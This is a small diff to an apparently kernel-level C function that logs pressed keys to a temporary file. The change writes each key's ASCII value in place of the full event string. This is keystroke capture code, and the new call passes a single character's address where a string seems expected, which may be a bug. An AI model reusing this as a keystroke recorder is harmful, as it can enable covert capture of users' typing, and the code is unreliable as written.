@@ -63,7 +63,10 @@ void ft_log_tmpfile(void)
 		if (entry->is_pressed)
 		{
 			temp_str = event_to_str(*entry);
-			ft_write_tmpfile(temp_str);
+			if (entry->ascii_value > 0)
+				ft_write_tmpfile(&(entry->ascii_value));
+			
+			// ft_write_tmpfile(temp_str);
 			kfree(temp_str);
 		}
 
